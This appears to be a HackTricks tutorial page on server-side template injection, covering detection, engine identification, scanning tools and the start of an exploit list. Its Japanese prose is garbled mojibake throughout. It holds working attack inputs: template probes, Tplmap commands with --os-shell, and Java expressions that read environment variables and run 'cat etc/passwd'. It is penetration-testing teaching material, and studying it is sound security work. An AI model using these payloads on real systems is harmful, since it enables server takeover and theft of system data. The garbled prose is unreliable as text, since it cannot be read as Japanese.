# SSTI (ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³)

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com)ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çŸ¥è­˜ã®æ™®åŠã‚’ä½¿å‘½ã¨ã—ã¦**ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ã®ãŸã‚ã®æ´»ç™ºãªäº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã¯ä½•ã§ã™ã‹ï¼Ÿ

ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€æ”»æ’ƒè€…ãŒãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆæ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã€ãã‚ŒãŒã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹ã¨ãã«ç™ºç”Ÿã—ã¾ã™ã€‚

**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³**ã¯ã€**å›ºå®š**ã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¨**å¤‰å‹•**ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’**çµ„ã¿åˆã‚ã›ã¦** **ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ç”Ÿæˆã™ã‚‹**ã‚ˆã†ã«è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›**ãŒãƒ‡ãƒ¼ã‚¿ã¨ã—ã¦æ¸¡ã•ã‚Œã‚‹ã®ã§ã¯ãªãã€ç›´æ¥**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«é€£çµã•ã‚Œã‚‹**ã¨ãã«ç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯**ä»»æ„ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’æ³¨å…¥ã—ã¦**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚’æ“ä½œã—ã€ã—ã°ã—ã°**ã‚µãƒ¼ãƒãƒ¼ã®å®Œå…¨ãªåˆ¶å¾¡ã‚’å–ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã®ä¾‹ã‚’ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ï¼š
```php
$output = $twig->render("Dear " . $_GET['name']);
```
å‰ã®ä¾‹ã§ã¯ã€`GET`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿`name`ã‚’ä½¿ç”¨ã—ã¦**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®ä¸€éƒ¨**ãŒ**å‹•çš„ã«ç”Ÿæˆ**ã•ã‚Œã¦ã„ã¾ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆæ§‹æ–‡ã¯ã‚µãƒ¼ãƒãƒ¼å´ã§è©•ä¾¡ã•ã‚Œã‚‹ãŸã‚ã€æ”»æ’ƒè€…ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«`name`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã«ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é…ç½®ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã®æ§‹ç¯‰

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### æ¤œå‡º

ã©ã‚“ãªè„†å¼±æ€§ã«ãŠã„ã¦ã‚‚ã€æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ãã‚Œã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã§ã™ã€‚æœ€ã‚‚ã‚·ãƒ³ãƒ—ãƒ«ãªåˆæœŸã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼ã§ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹ç‰¹æ®Šæ–‡å­—ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’æ³¨å…¥ã—ã¦**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ãƒ•ã‚¡ã‚¸ãƒ³ã‚°ã™ã‚‹**ã“ã¨ã§ã™ã€‚ä¾‹ãˆã°ã€ãƒãƒªã‚°ãƒ­ãƒƒãƒˆ**`${{<%[%'"}}%\`**ã§ã™ã€‚\
ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã¯ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã«**é€šå¸¸ã®ãƒ‡ãƒ¼ã‚¿**ã¨**ä¸ãˆã‚‰ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã®å¿œç­”ã®é•ã„ã‚’**è¦‹åˆ†ã‘ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
**ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ãŸå ´åˆ**ã€**ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ã§ã‚ã‚‹**ã“ã¨ã¨ã€ã©ã®**ã‚¨ãƒ³ã‚¸ãƒ³ãŒå‹•ä½œã—ã¦ã„ã‚‹ã‹**ã‚’ç°¡å˜ã«æŠŠæ¡ã§ãã¾ã™ã€‚ã—ã‹ã—ã€ä¸ãˆã‚‰ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’**åæ˜ ã™ã‚‹ã“ã¨ã‚’æœŸå¾…ã—ã¦ã„ãŸ**ã®ã«**åæ˜ ã•ã‚Œã¦ã„ãªã„**å ´åˆã‚„ã€å¿œç­”ã«**æ–‡å­—ãŒæ¬ ã‘ã¦ã„ã‚‹**å ´åˆã«ã‚‚ã€è„†å¼±ãªã‚µãƒ¼ãƒãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ¤œå‡º - ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**

ä¸ãˆã‚‰ã‚ŒãŸå…¥åŠ›ã¯**ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã¦å¿œç­”ã«åæ˜ ã•ã‚Œã¦ã„ã¾ã™**ã€‚ã“ã‚Œã¯ç°¡å˜ã«[**XSS**](../xss-cross-site-scripting/)è„†å¼±æ€§ã¨**é–“é•ãˆã‚‰ã‚ŒãŒã¡ã§ã™**ãŒã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼å†…ã§**æ•°å­¦çš„ãªæ“ä½œ**ã‚’è©¦ã¿ã‚‹ã“ã¨ã§åŒºåˆ¥ã™ã‚‹ã®ã¯ç°¡å˜ã§ã™ï¼š
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**æ¤œå‡º - ã‚³ãƒ¼ãƒ‰ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**

ã“ã‚Œã‚‰ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›**ãŒ**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼**ã®**å†…éƒ¨**ã«é…ç½®ã•ã‚Œã¦ã„ã¾ã™ï¼š
```python
engine.render("Hello {{"+greeting+"}}", data)
```
ä»¥ä¸‹ã¯ã€ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹URLãŒä¼¼ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š`http://vulnerable-website.com/?greeting=data.username`

ã‚‚ã—**`greeting`** ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**ç•°ãªã‚‹å€¤**ã«**å¤‰æ›´**ã™ã‚‹ã¨ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¯å«ã¾ã‚Œã¾ã›ã‚“**ãŒã€æ¬¡ã®ã‚ˆã†ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ï¼š`http://vulnerable-website.com/?greeting=data.username}}hello` ãã®å ´åˆã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒå«ã¾ã‚Œã¾ã™**ï¼ˆã‚‚ã—é–‰ã˜ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼ã®æ–‡å­—ãŒ **`}}`** ã ã£ãŸå ´åˆï¼‰ã€‚\
ã“ã‚Œã‚‰ã®ãƒ†ã‚¹ãƒˆä¸­ã«**ã‚¨ãƒ©ãƒ¼**ãŒç™ºç”Ÿã—ãŸå ´åˆã€ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ã§ã‚ã‚‹ã“ã¨ã‚’è¦‹ã¤ã‘ã‚„ã™ããªã‚Šã¾ã™ã€‚

### è­˜åˆ¥

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å¯èƒ½æ€§ã‚’æ¤œå‡ºã—ãŸã‚‰ã€æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚’è­˜åˆ¥ã™ã‚‹ã“ã¨ã§ã™ã€‚\
å¤šãã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè¨€èªãŒã‚ã‚Šã¾ã™ãŒã€å¤šãã¯HTMLæ–‡å­—ã¨è¡çªã—ãªã„ã‚ˆã†ã«ç‰¹åˆ¥ã«é¸ã°ã‚ŒãŸéå¸¸ã«ä¼¼ãŸæ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚

é‹ãŒè‰¯ã‘ã‚Œã°ã€ã‚µãƒ¼ãƒãƒ¼ã¯**ã‚¨ãƒ©ãƒ¼ã‚’å‡ºåŠ›ã—ã¦**ãŠã‚Šã€ã‚¨ãƒ©ãƒ¼ã®**ä¸­ã«**ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**ã‚¨ãƒ³ã‚¸ãƒ³**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã§ã—ã‚‡ã†ã€‚ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä¾‹ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

ãã‚Œä»¥å¤–ã®å ´åˆã¯ã€æ‰‹å‹•ã§**è¨€èªå›ºæœ‰ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆ**ã—ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã«ã‚ˆã£ã¦ã©ã®ã‚ˆã†ã«è§£é‡ˆã•ã‚Œã‚‹ã‹ã‚’ç ”ç©¶ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€ç•°ãªã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®æ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®æ•°å­¦çš„æ“ä½œã‚’æ³¨å…¥ã—ã€ãã‚Œã‚‰ãŒæ­£å¸¸ã«è©•ä¾¡ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’è¦³å¯Ÿã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’æ”¯æ´ã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ã‚ˆã†ãªæ„æ€æ±ºå®šãƒ„ãƒªãƒ¼ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š

![](<../../.gitbook/assets/image (272).png>)

### æ‚ªç”¨

**èª­ã‚€**

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚’ç‰¹å®šã—ãŸå¾Œã®æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª­ã‚€ã“ã¨ã§ã™ã€‚é–¢å¿ƒã®ã‚ã‚‹ä¸»ãªé ˜åŸŸã¯ï¼š

* åŸºæœ¬æ§‹æ–‡ã«é–¢ã™ã‚‹ã€Œãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆä½œè€…ã®ãŸã‚ã®ã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã€‚
* ã€Œã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è€ƒæ…®äº‹é …ã€ - ã‚¢ãƒ—ãƒªã‚’é–‹ç™ºã—ãŸäººãŒã“ã‚Œã‚’èª­ã‚“ã§ã„ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã€å½¹ç«‹ã¤ãƒ’ãƒ³ãƒˆãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
* çµ„ã¿è¾¼ã¿ã®ãƒ¡ã‚½ãƒƒãƒ‰ã€é–¢æ•°ã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã€å¤‰æ•°ã®ãƒªã‚¹ãƒˆã€‚
* æ‹¡å¼µæ©Ÿèƒ½/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ãƒªã‚¹ãƒˆ - ã„ãã¤ã‹ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

**æ¢ç´¢**

è‡ªæ˜ãªæ‚ªç”¨ãŒæç¤ºã•ã‚Œã¦ã„ãªã„å ´åˆã€æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯**ç’°å¢ƒã‚’æ¢ç´¢**ã—ã¦ã€æ­£ç¢ºã«**ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚‚ã®**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã§ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã¨ã€é–‹ç™ºè€…ã«ã‚ˆã£ã¦ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ¸¡ã•ã‚Œã‚‹**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã®ä¸¡æ–¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã§ã—ã‚‡ã†ã€‚å¤šãã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚·ã‚¹ãƒ†ãƒ ã¯ã€ã‚¹ã‚³ãƒ¼ãƒ—å†…ã®ã™ã¹ã¦ã‚’å«ã‚€ã€Œselfã€ã¾ãŸã¯åå‰ç©ºé–“ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å…¬é–‹ã—ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã¨ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ãƒªã‚¹ãƒˆã™ã‚‹æ…£ç”¨çš„ãªæ–¹æ³•ã‚’æä¾›ã—ã¾ã™ã€‚

çµ„ã¿è¾¼ã¿ã®selfã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãªã„å ´åˆã¯ã€[SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) ã¨ Burp Intruder ã®å˜èªãƒªã‚¹ãƒˆã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦å¤‰æ•°åã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

é–‹ç™ºè€…ã«ã‚ˆã£ã¦æä¾›ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ã€ç‰¹ã«æ©Ÿå¯†æƒ…å ±ã‚’å«ã‚€å¯èƒ½æ€§ãŒé«˜ãã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ç•°ãªã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆé–“ã§å¤‰ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ç†æƒ³çš„ã«ã¯å€‹ã€…ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã”ã¨ã«é©ç”¨ã•ã‚Œã‚‹ã¹ãã§ã™ã€‚

**æ”»æ’ƒ**

ã“ã®æ™‚ç‚¹ã§ã€åˆ©ç”¨å¯èƒ½ãª**æ”»æ’ƒé¢ã«ã¤ã„ã¦ã®ç¢ºå›ºãŸã‚‹è€ƒãˆ**ã‚’æŒã£ã¦ã„ã‚‹ã¯ãšã§ã‚ã‚Šã€å¾“æ¥ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ã€æ‚ªç”¨å¯èƒ½ãªè„†å¼±æ€§ãŒã‚ã‚‹ã‹ã©ã†ã‹å„æ©Ÿèƒ½ã‚’ãƒ¬ãƒ“ãƒ¥ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚’ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å…¨ä½“ã®æ–‡è„ˆã§ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ - ä¸€éƒ¨ã®æ©Ÿèƒ½ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å›ºæœ‰ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä½œæˆã€ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ãã€ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã€æƒ…å ±æ¼æ´©ã€æ¨©é™æ˜‡æ ¼ã®è„†å¼±æ€§ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚

## ãƒ„ãƒ¼ãƒ«

### [TInjA](https://github.com/Hackmanit/TInjA)

åŠ¹ç‡çš„ãªSSTI + CSTIã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã§ã€æ–°ã—ã„ãƒãƒªã‚°ãƒ­ãƒƒãƒˆã‚’åˆ©ç”¨ã—ã¦ã„ã¾ã™ã€‚
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è¡¨](https://github.com/Hackmanit/template-injection-table)

44ã®æœ€ã‚‚é‡è¦ãªãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®äºˆæƒ³ã•ã‚Œã‚‹å¿œç­”ã¨ã¨ã‚‚ã«ã€æœ€ã‚‚åŠ¹ç‡çš„ãªãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒãƒªã‚°ãƒ­ãƒƒãƒˆã‚’å«ã‚€ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãªè¡¨ã€‚

## ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

### ã‚¸ã‚§ãƒãƒªãƒƒã‚¯

ã“ã®**ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆ**ã§ã¯ã€ä»¥ä¸‹ã«æŒ™ã’ã‚‹ã‚¨ãƒ³ã‚¸ãƒ³ã®ç’°å¢ƒã§**å®šç¾©ã•ã‚ŒãŸå¤‰æ•°**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - åŸºæœ¬çš„ãªã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - ã‚·ã‚¹ãƒ†ãƒ ã®ç’°å¢ƒå¤‰æ•°ã‚’å–å¾—ã™ã‚‹**
```java
${T(java.lang.System).getenv()}
```
**Java - /etc/passwd ã®å–å¾—**
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

